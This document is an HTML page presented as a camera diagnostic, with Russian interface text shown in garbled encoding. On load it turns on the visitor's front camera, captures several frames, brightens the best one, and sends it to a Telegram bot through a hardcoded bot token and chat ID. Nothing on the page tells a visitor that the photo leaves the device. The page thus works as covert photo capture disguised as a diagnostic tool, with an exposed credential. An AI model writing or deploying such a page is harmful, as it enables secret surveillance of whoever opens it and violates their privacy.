<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Camera Diagnostic</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            padding: 20px; 
            background: #000; 
            color: #0f0;
            text-align: left;
            margin: 0;
        }
        .status { 
            margin: 10px 0; 
            padding: 10px; 
            border-radius: 5px; 
            border-left: 4px solid #333;
            word-break: break-word;
        }
        .waiting { 
            background: #111; 
            border-left-color: #333;
        }
        .success { 
            background: #0d3a0d; 
            border-left-color: #0f0;
        }
        .error { 
            background: #3a0d0d; 
            color: #f00;
            border-left-color: #f00;
        }
        #log {
            max-width: 800px;
            margin: 0 auto;
            font-size: 14px;
        }
        h2 {
            text-align: center;
            margin-bottom: 30px;
            color: #0f0;
        }
    </style>
</head>
<body>
    <div id="log">
        <h2>üì± –î–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∞ –∫–∞–º–µ—Ä—ã (–ò—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è)</h2>
        <div class="status waiting">üîÑ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...</div>
    </div>

<script>
const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
const CHAT_ID = '1250741267';
const log = document.getElementById('log');

function addLog(message, type = 'waiting') {
    const div = document.createElement('div');
    div.className = `status ${type}`;
    div.textContent = `[${new Date().toLocaleTimeString().slice(0,8)}] ${message}`;
    log.appendChild(div);
}

async function runDiagnostic() {
    let stream = null;
    let video = null;
    
    try {
        addLog('1. –ü—Ä–æ–≤–µ—Ä—è—é –ø–æ–¥–¥–µ—Ä–∂–∫—É –∫–∞–º–µ—Ä—ã...');
        
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            throw new Error('–ë—Ä–∞—É–∑–µ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –∫–∞–º–µ—Ä—É');
        }
        
        addLog('‚úÖ API –∫–∞–º–µ—Ä—ã –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è', 'success');
        addLog('2. –ó–∞–ø—Ä–∞—à–∏–≤–∞—é –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ...');
        
        // –ü–æ–ª—É—á–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ
        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }
        });
        
        addLog('‚úÖ –§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞ –¥–æ—Å—Ç—É–ø–Ω–∞', 'success');
        
        // === –ö–õ–Æ–ß–ï–í–û–ï –ò–°–ü–†–ê–í–õ–ï–ù–ò–ï 1: –ü—Ä–∞–≤–∏–ª—å–Ω–∞—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –≤–∏–¥–µ–æ ===
        addLog('3. –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É—é –≤–∏–¥–µ–æ —ç–ª–µ–º–µ–Ω—Ç...');
        
        video = document.createElement('video');
        video.srcObject = stream;
        video.autoplay = true;
        video.playsInline = true;
        video.muted = true;
        
        // –ñ–¥—ë–º, –ø–æ–∫–∞ –≤–∏–¥–µ–æ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ –Ω–∞—á–Ω—ë—Ç –≤–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç—å—Å—è
        addLog('4. –ñ–¥—É –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –∫–∞–º–µ—Ä—ã...');
        
        await new Promise((resolve, reject) => {
            let attempts = 0;
            const checkVideo = () => {
                attempts++;
                
                // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ –≤–∏–¥–µ–æ –∏–º–µ–µ—Ç –Ω–µ–Ω—É–ª–µ–≤—ã–µ —Ä–∞–∑–º–µ—Ä—ã –∏ –µ—Å—Ç—å –ø–æ—Ç–æ–∫
                if (video.videoWidth > 0 && video.videoHeight > 0 && 
                    video.readyState >= 2) {
                    addLog(`‚úÖ –í–∏–¥–µ–æ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–æ: ${video.videoWidth}x${video.videoHeight}`, 'success');
                    resolve();
                } else if (attempts > 30) { // 30 –ø–æ–ø—ã—Ç–æ–∫ –ø–æ 200–º—Å = 6 —Å–µ–∫—É–Ω–¥
                    reject(new Error('–¢–∞–π–º–∞—É—Ç –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –≤–∏–¥–µ–æ'));
                } else {
                    setTimeout(checkVideo, 200); // –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞–∂–¥—ã–µ 200–º—Å
                }
            };
            checkVideo();
        });
        
        // === –ö–õ–Æ–ß–ï–í–û–ï –ò–°–ü–†–ê–í–õ–ï–ù–ò–ï 2: –î–∞—ë–º –∫–∞–º–µ—Ä–µ –≤—Ä–µ–º—è –Ω–∞ –∞–¥–∞–ø—Ç–∞—Ü–∏—é ===
        addLog('5. –ù–∞—Å—Ç—Ä–∞–∏–≤–∞—é —ç–∫—Å–ø–æ–∑–∏—Ü–∏—é –∫–∞–º–µ—Ä—ã (5 —Å–µ–∫—É–Ω–¥)...');
        for (let i = 5; i > 0; i--) {
            addLog(`   –≠–∫—Å–ø–æ–∑–∏—Ü–∏—è: ${i} —Å–µ–∫...`, 'waiting');
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
        
        // === –ö–õ–Æ–ß–ï–í–û–ï –ò–°–ü–†–ê–í–õ–ï–ù–ò–ï 3: –î–µ–ª–∞–µ–º –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ç–µ—Å—Ç–æ–≤—ã—Ö —Å–Ω–∏–º–∫–æ–≤ ===
        addLog('6. –î–µ–ª–∞—é —Ç–µ—Å—Ç–æ–≤—ã–µ —Å–Ω–∏–º–∫–∏...');
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        
        let bestBrightness = 0;
        let bestImageData = null;
        
        // –î–µ–ª–∞–µ–º 5 –ø–æ–ø—ã—Ç–æ–∫ —Å —Ä–∞–∑–Ω—ã–º–∏ –∑–∞–¥–µ—Ä–∂–∫–∞–º–∏
        for (let attempt = 1; attempt <= 5; attempt++) {
            addLog(`   –ü–æ–ø—ã—Ç–∫–∞ ${attempt}/5...`, 'waiting');
            
            // –ñ–¥—ë–º –ø–µ—Ä–µ–¥ –∫–∞–∂–¥–æ–π –ø–æ–ø—ã—Ç–∫–æ–π
            await new Promise(resolve => setTimeout(resolve, 300));
            
            // –î–µ–ª–∞–µ–º —Å–Ω–∏–º–æ–∫
            ctx.drawImage(video, 0, 0);
            
            // –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º —è—Ä–∫–æ—Å—Ç—å –≤—Å–µ–≥–æ –∫–∞–¥—Ä–∞
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            const data = imageData.data;
            
            let brightnessSum = 0;
            let validPixels = 0;
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞–∂–¥—ã–π 10-–π –ø–∏–∫—Å–µ–ª—å –¥–ª—è —Å–∫–æ—Ä–æ—Å—Ç–∏
            for (let i = 0; i < data.length; i += 40) {
                const r = data[i];
                const g = data[i + 1];
                const b = data[i + 2];
                const brightness = 0.299 * r + 0.587 * g + 0.114 * b;
                
                if (brightness > 1) { // –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –ø–æ–ª–Ω–æ—Å—Ç—å—é —á—ë—Ä–Ω—ã–µ –ø–∏–∫—Å–µ–ª–∏
                    brightnessSum += brightness;
                    validPixels++;
                }
            }
            
            const avgBrightness = validPixels > 0 ? brightnessSum / validPixels : 0;
            
            addLog(`     –Ø—Ä–∫–æ—Å—Ç—å: ${avgBrightness.toFixed(2)}`, 
                   avgBrightness > 50 ? 'success' : 
                   avgBrightness > 10 ? 'waiting' : 'error');
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –ª—É—á—à–∏–π —Å–Ω–∏–º–æ–∫
            if (avgBrightness > bestBrightness) {
                bestBrightness = avgBrightness;
                bestImageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            }
        }
        
        // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É
        stream.getTracks().forEach(track => track.stop());
        
        // === –ö–õ–Æ–ß–ï–í–û–ï –ò–°–ü–†–ê–í–õ–ï–ù–ò–ï 4: –ò—Å–ø–æ–ª—å–∑—É–µ–º –ª—É—á—à–∏–π —Å–Ω–∏–º–æ–∫ ===
        if (bestImageData) {
            ctx.putImageData(bestImageData, 0, 0);
            
            // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —É–ª—É—á—à–∞–µ–º —Ñ–æ—Ç–æ –µ—Å–ª–∏ –æ–Ω–æ —Ç—ë–º–Ω–æ–µ
            if (bestBrightness < 30) {
                addLog('‚ö†Ô∏è –§–æ—Ç–æ —Ç—ë–º–Ω–æ–µ, –ø—Ä–∏–º–µ–Ω—è—é –∫–æ—Ä—Ä–µ–∫—Ü–∏—é —è—Ä–∫–æ—Å—Ç–∏...', 'waiting');
                
                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                const data = imageData.data;
                
                for (let i = 0; i < data.length; i += 4) {
                    data[i] = Math.min(255, data[i] * 2.0);     // –ö—Ä–∞—Å–Ω—ã–π
                    data[i + 1] = Math.min(255, data[i + 1] * 2.0); // –ó–µ–ª—ë–Ω—ã–π
                    data[i + 2] = Math.min(255, data[i + 2] * 2.0); // –°–∏–Ω–∏–π
                }
                
                ctx.putImageData(imageData, 0, 0);
                bestBrightness *= 2; // –û–±–Ω–æ–≤–ª—è–µ–º —Ä–∞—Å—á—ë—Ç–Ω—É—é —è—Ä–∫–æ—Å—Ç—å
            }
            
            addLog(`‚úÖ –õ—É—á—à–∞—è —è—Ä–∫–æ—Å—Ç—å: ${bestBrightness.toFixed(2)}`, 
                   bestBrightness > 50 ? 'success' : 'waiting');
        } else {
            throw new Error('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –Ω–∏ –æ–¥–Ω–æ–≥–æ —Å–Ω–∏–º–∫–∞');
        }
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
        addLog('7. –û—Ç–ø—Ä–∞–≤–ª—è—é —Ä–µ–∑—É–ª—å—Ç–∞—Ç...');
        
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'corrected_photo.jpg');
            formData.append('caption', `–ò—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è\n–Ø—Ä–∫–æ—Å—Ç—å: ${bestBrightness.toFixed(2)}\n–†–∞–∑–º–µ—Ä: ${canvas.width}x${canvas.height}\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}`);
            
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            
            if (result.ok) {
                addLog('‚úÖ –§–æ—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!', 'success');
                addLog(`‚úÖ ID —Å–æ–æ–±—â–µ–Ω–∏—è: ${result.result.message_id}`, 'success');
                
                const final = document.createElement('div');
                final.className = 'status success';
                final.style.cssText = 'text-align: center; font-size: 16px; padding: 20px; margin-top: 20px;';
                final.textContent = `‚úÖ –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–æ! –Ø—Ä–∫–æ—Å—Ç—å —Ñ–æ—Ç–æ: ${bestBrightness.toFixed(2)}. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ Telegram.`;
                log.appendChild(final);
                
            } else {
                throw new Error(`–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: ${result.description}`);
            }
        }, 'image/jpeg', 0.9);
        
    } catch (error) {
        addLog(`‚ùå –û–®–ò–ë–ö–ê: ${error.message}`, 'error');
        
        if (stream) stream.getTracks().forEach(track => track.stop());
        
        const finalError = document.createElement('div');
        finalError.className = 'status error';
        finalError.style.cssText = 'text-align: center; font-size: 16px; padding: 20px; margin-top: 20px;';
        finalError.textContent = '‚ùå –û—à–∏–±–∫–∞ –¥–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∏. –°–∫–æ–ø–∏—Ä—É–π—Ç–µ —Ç–µ–∫—Å—Ç –≤—ã—à–µ.';
        log.appendChild(finalError);
    }
}

window.addEventListener('DOMContentLoaded', runDiagnostic);
</script>
</body>
</html>
